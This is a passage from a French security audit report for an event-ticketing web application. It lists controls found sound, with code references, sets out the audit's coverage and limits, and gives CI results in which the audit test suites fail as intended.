| (L) Panier et montant | Prix, frais et total recalculés en base sous verrou (`PRICE_CHANGED`), catégorie d'un autre événement, inactive, guichet ou hors fenêtre refusée, doublon de catégorie refusé, prix entiers et minimum, frais arrondis au franc supérieur, quantités négatives refusées, un seul paiement en attente par compte et événement (verrou consultatif) | `20261109000007_lot9bis_versements.sql:723-793` ; `20261106000001_lot8_canaux.sql:227-271` ; `20261101000003_lot3_moteur.sql:39-40`, `:85-88` |
| (L) Double paiement, succès tardif | Verrous événement, paiement, catégories ; confirmation rejouée sans effet ; succès tardif : stock relu sous verrou, événement annulé ou terminé → remboursement ; doublon du même panier détecté sous verrou → un seul jeu de billets (voir AUD-20 pour le coût) | `20261106000003_lot8_paiement.sql:61-66`, `:115-193` ; `tests/parcours/double-paiement.test.ts` |
| (L) Remboursements | Deux demandes simultanées sérialisées (verrous, clé `REFUND-TKT-<billet>` unique) ; billet utilisé, annulé ou déjà remboursé refusé ; gratuit et invitation annulés sans argent ; part plafonnée au reste du paiement ; espèces marquées deux fois → `ALREADY_MARKED` sans écriture financière | `20261110000006_lot9ter_equipe_messages.sql:207-339` ; `20261101000005_lot3_remboursements.sql:218-227` ; `20261109000006_lot9bis_argent.sql:458-500` |
| (L) Retraits concurrents | Verrou du compte, contrôle à l'heure réelle après le verrou, débit immédiat, clé d'idempotence ; solde arrondi au franc inférieur, net positif | `20261109000006_lot9bis_argent.sql:649-744` ; `20261110000005_lot9ter_argent.sql:366-400` |
| (L) Réglages financiers | SUPERADMIN ACTIF en base, liste blanche des clés, bornes (frais de service 0-50 %, agrégateur 0-10 %, garde 5-60 min) : aucune valeur négative possible | `20261110000002_lot9ter_reglages.sql:80-136` |
| (L) Parrainage | Commission créée au seul passage à SUCCESS, plafonnée au revenu net, idempotente ; annulée ou régularisée au remboursement ; le cron ne fait que libérer (aucun double versement) ; relation créée seulement après le code d'inscription (voir AUD-30) | `20261109000007_lot9bis_versements.sql:834-886` ; `20261106000004_lot8_commissions.sql:161`, `:186` ; `20261101000006_lot3_commissions.sql:140-142` |
| (L) Propriété des routes partenaire | Édition d'événement et de catégories, transitions, annulation, pilotage (six onglets), zones, invitations, rapports de clôture, export comptable, caisses et PIN, équipe : un partenaire B est refusé (404/403) ; permission `events.write` d'un admin revérifiée en base (sauf AUD-24) ; partenaire suspendue ou non validée bloquée | `lib/events/event.service.ts:230-268` ; `20261108000001_lot9_securite.sql:536-552` ; `20261109000004_lot9bis_droits.sql:114-131` ; `20261109000008_lot9bis_cycle.sql:259-309` ; `lib/partner/partner-dashboard.service.ts:785-786`, `:1138-1139` ; `app/api/partner/team/assignments/route.ts:124-129` |
| (L) Catalogue public | Seuls PUBLIE, SUSPENDU, ANNULE, TERMINE ; catégories `is_active` et vendues en ligne ; aucun motif interne ni stock exact exposé | `lib/events/public-status.ts:27-29` ; `app/api/events/[id]/route.ts:113` |
| (L) Filtres PostgREST | Les trois `.or()` qui interpolent une saisie passent par `pgIlikeContains` (échappement de `\`, `%`, `_`, guillemets) | `lib/security/postgrest-filter.ts:14-30` |
| (L) Notifications et push | Cloche filtrée par `user_id` en base ; abonnements push : liste blanche d'origines revérifiée à l'envoi, clés contrôlées, 10 appareils au plus | `20261103000007_lot6_cloche.sql:123-187` ; `lib/push/endpoints.ts:80-97` ; `lib/notifications/dispatcher.ts:444` |
| (L) PDF et SMS | Chaînes saisies échappées dans les PDF (`\`, `(`, `)`, fins de ligne) ; toute valeur saisie d'un SMS passe par `smsVar` (GSM-7, longueur bornée, un segment vérifié par les tests) ; seuls les numéros mobiles +221 sont acceptés | `lib/pdf/pdf-text.ts:26-36` ; `lib/notifications/sms-format.ts:139` ; `tests/parcours/notif-modeles.test.ts` |
| (L) Erreurs renvoyées | `apiFailure` ne laisse passer que les `PublicError` ; refus SamirPay traduits | `lib/api/public-error.ts:50-56` ; `lib/payments/cashin-init.ts:38-47` |
| (L) Vérification d'email | Jeton de 256 bits, seule l'empreinte stockée, 24 h, usage unique sous verrou, quotas (voir AUD-34) | `lib/email/verification.ts:129-133` ; `20261109000010_lot9bis_email.sql:796-1030` |
| (L) Mot de passe applicatif | Mot de passe actuel vérifié, quota par compte, autres sessions révoquées ; confirmation récente liée à la session | `lib/auth/password-confirm.ts:42-70` ; `app/api/account/password/route.ts:105-116` ; `app/api/account/password-confirm/route.ts:37-53` |
| (L) Connexion | Même réponse pour numéro inconnu et mauvais mot de passe ; quota par IP avant toute lecture ; identifiant GoTrue jamais renvoyé | `app/api/auth/login/route.ts:24-26`, `:51-75` |
| (L) Inscription partenaire | Rôle PARTENAIRE donné tout de suite mais compte EN_ATTENTE ; créer un événement exige une fiche VALIDE | `app/api/partner/events/route.ts:87-92` |
| PIN de caisse, codes hors ligne | PIN régisseur de 6 chiffres tirés par `crypto.randomInt`, haché avec sel et clé hors base, 5 essais par 15 minutes par caisse ou par ouverture ; codes hors ligne : 12 lots par billet et 60 par compte et par heure, octroi en base | `lib/shifts/shift.service.ts:12-15`, `:269`, `:290-298` ; `lib/tickets/offline-codes.service.ts:106-122` |
| Journaux | Numéros tronqués dans les journaux d'envoi SMS ; journal des SMS synchrones (codes à usage unique) sans le code, seulement son objet ; journaux serveur par identifiants de compte. Seule exception relevée : le numéro complet en cas de doublon de comptes | `lib/sms/mtarget.service.ts:139`, `:159` ; `20261108000004_lot9_compte.sql:89-101` ; exception `app/api/partner/team/invite/route.ts:129` |
| Exports CSV | Formules neutralisées (`=`, `+`, `-`, `@`, tabulation) | `lib/events/pilotage.service.ts:193-198` |
| Emails | Toute valeur variable échappée avant le HTML | `lib/notifications/email-layout.ts:29-33` |
| Redirections | Paramètre `redirect` filtré par `safeInternalPath` | `app/register/page.tsx:148` |
| Routes de développement | `*.dev.ts(x)` (dont `app/api/dev/samirpay/[action]/route.dev.ts`) ne sont des routes que sous `next dev` | `next.config.mjs:100-103` |
| Rôles | Jamais lus dans `user_metadata` pour l'autorisation (serveur, middleware, RLS) ; seule exception, la marque « coquille » (AUD-02) | `lib/auth/session.ts:69-90` ; `middleware.ts:83` |
| Secrets du navigateur | Cinq variables `NEXT_PUBLIC_*` seulement : `SUPABASE_URL`, `SUPABASE_ANON_KEY`, `APP_URL`, `MAP_TILE_URL`, `MAP_TILE_ATTRIBUTION` (aucun secret) ; aucun composant client ni hook n'importe `lib/env.ts` | grep de `NEXT_PUBLIC_` dans app, components, lib, hooks ; `lib/env.ts:6-7` |

---

## 5. Couverture et limites de cet audit

### Méthode

**Auditeur principal.** Il a lu les surfaces les plus exposées et écrit les tests : routes anonymes, GoTrue appelable
directement, webhook, catalogue réel de la base, aides RLS.

**Lectures parallèles.** Cinq lectures ont couvert l'argent, les billets et l'entrée, les comptes, la propriété des routes
partenaire et admin, les coûts, le navigateur et les journaux. Elles avaient d'abord été arrêtées par une limite d'usage
de l'API, puis ont repris quand l'utilisateur l'a réinitialisée. Leurs constats n'entrent au rapport qu'après relecture
des lignes citées. Deux affirmations ont été corrigées à la relecture :

- le quota de saisie manuelle annoncé (« 20 par minute ») n'existe pas ; seul le quota général de scan est cité ;
- l'atténuation du middleware pour AUD-12 a été ajoutée.

**Lectures en base.** La sixième lecture prévue n'a pas été relancée : le catalogue réel imprimé par la CI la remplace
(tableaux 1 et 2).

### Couverture par point de la consigne

| Point de la consigne | Couverture | Reste à faire |
|---|---|---|
| 1. Fonctions exécutables | Complète (catalogue réel, tableau 1) | — |
| 2. Lectures (politiques, vues, colonnes) | Complète (catalogue réel, tableau 2 ; lignes visibles mesurées pour un visiteur et cinq comptes) | — |
| 3. Stockage | Complète : buckets, politiques, dépôt, URL signée, purge (AUD-25, AUD-36) | Durée des URL signées des pièces partenaires non relevée |
| 4. Temps réel | Publication réelle (tableau 2) et code client lus ; aucun canal broadcast | Abonnement réel d'un compte tiers non testé (Realtime applique les politiques du tableau 2) |
| 5. Routes API | Complète : garde de session des 175 routes, propriété route par route sur `partner/**` et `admin/**` (AUD-22 à AUD-24, AUD-35 à AUD-38), cron, webhook, hook SMS | Corps des RPC `controller_assignments_sync`, `controller_invitation_create` et `event_update` (garde d'appelant seule) |
| 6. Argent | Complète (AUD-20, AUD-21, AUD-27 à AUD-31 ; sains : double paiement, remboursements, retraits, frais, commissions) | Total de `orders/create`, `cashout_admin_not_sent`, `fin_frozen_amount` (modules ou cas marginaux) |
| 7. Billets et entrée | Complète (AUD-13 à AUD-16) | Client hors ligne du scanner, `controller_assignments_sync` |
| 8. Comptes | Complète (AUD-01, AUD-02, AUD-06, AUD-07, AUD-12, AUD-19, AUD-34) | Réglages Auth réels du projet hébergé (SMTP, « Secure password change », URL de redirection) et MX du domaine `eventvillage.sn` : ils fixent la gravité d'AUD-19 ; recyclage des numéros par l'opérateur |
| 9. Coûts | Complète (AUD-04, AUD-05, AUD-18, AUD-21, AUD-25, AUD-32) | Facturation réelle des initiations SamirPay (aucune documentation dans le dépôt) |
| 10. Navigateur | Complète (AUD-11, AUD-17, AUD-26 ; sains : PDF, SMS, emails, erreurs, redirections internes) | Rendu des textes dans toutes les pages (React échappe ; seuls les `href` dynamiques et `innerHTML` ont été contrôlés) |
| 11. Dépendances | Complète (`npm audit --omit=dev`, AUD-10) | Applicabilité de chaque avis Next.js |
| 12. Journaux | Complète (AUD-33 ; sains : SMS tronqués, codes jamais stockés) | — |

### Ce qui n'a pas été fait

- Aucun test contre un projet distant ni un hébergement réel. AUD-08, AUD-09 et la gravité d'AUD-19 se confirment en
  préproduction.
- Les modules salles, tables, commandes et restaurants ont seulement été survolés (hors périmètre ; voir AUD-22 et AUD-28).

---

## 6. Run CI de la branche

Les tests finals sont au commit `68a6e41` ; ce rapport s'ajoute dans un commit de documentation seule.

| Run | Commit | Issue | Remarque |
|---|---|---|---|
| 138 | `c65fd06` | annulé | Remplacé par la poussée suivante : la concurrence de la CI annule le run en cours. |
| 139 | `1a569c13` | annulé pendant l'e2e | Vérification terminée : 347 suites vertes, 6 rouges (les 6 premières suites d'audit). |
| 140 | `848d31af` | annulé | Remplacé par la poussée suivante. |
| 141 | `a2101e8f` | annulé | Remplacé par la poussée suivante. |
| **142** | **`68a6e41e`** | **échec attendu** | **Version finale des tests** (journaux : `origin/ci-results`, `runs/142-43360987642/`). |

**Run 142** :

- **verify** : rouge à l'étape `test`, comme attendu. Typecheck et lint verts.
- **Suites** : 355 au total, dont 347 vertes. Les 8 rouges sont exactement les 8 suites de `tests/audit/` (12 tests
  rouges), chacune pour la raison décrite dans son constat ; aucune autre suite n'est rouge.
- **build de mesure et e2e** : verts (`build_mesure=success`, `e2e=success`, étape e2e code 0) ; durée du job : 3 574 s.

Récapitulatif brut de `npm run test` (lignes en échec et total ; les 347 lignes `PASS` sont omises) :

```text
═══════════════════ RÉCAPITULATIF ═══════════════════
Suite                                                    Statut   Durée     Code  Journal
tests/audit/aud-00-catalogue.test.ts                     FAIL     720ms     1     .test-logs/tests__audit__aud-00-catalogue.test.ts.log
tests/audit/aud-01-comptes-gotrue.test.ts                FAIL     1.7s      1     .test-logs/tests__audit__aud-01-comptes-gotrue.test.ts.log
tests/audit/aud-04-webhook-journal.test.ts               FAIL     517ms     1     .test-logs/tests__audit__aud-04-webhook-journal.test.ts.log
tests/audit/aud-05-sms-plafond-global.test.ts            FAIL     548ms     1     .test-logs/tests__audit__aud-05-sms-plafond-global.test.ts.log
tests/audit/aud-06-partenaire-suspendu.test.ts           FAIL     1.3s      1     .test-logs/tests__audit__aud-06-partenaire-suspendu.test.ts.log
tests/audit/aud-07-enumeration-comptes.test.ts           FAIL     565ms     1     .test-logs/tests__audit__aud-07-enumeration-comptes.test.ts.log
tests/audit/aud-17-redirection-connexion.test.ts         FAIL     262ms     1     .test-logs/tests__audit__aud-17-redirection-connexion.test.ts.log
tests/audit/aud-19-code-email-adresse-technique.test.ts  FAIL     605ms     1     .test-logs/tests__audit__aud-19-code-email-adresse-technique.test.ts.log
──────────────────────────────────────────────────────
TOTAL : 355 suite(s) — 347 réussie(s), 8 en échec, 0 expirée(s)
[verify] ÉCHEC à l'étape "test" (code 1).
```

Synthèse de Playwright (`runs/142-43360987642/e2e.log`) :

```text
2 passed (42.1s)
  13 passed (2.2m)
  4 passed (4.0s)
  4 passed (3.2m)
  10 passed (2.1m)
```

**Seule modification hors des tests et du rapport : `.github/workflows/verify.yml`** (commit `c3c46186`). La branche
`audit/**` y est ajoutée aux déclencheurs `push`. Sans cela, la consigne « run CI de la branche » était impossible : le
workflow ne tourne que sur `main`, `fix/**` et `lot*/**`. Aucune autre ligne du workflow ne change.
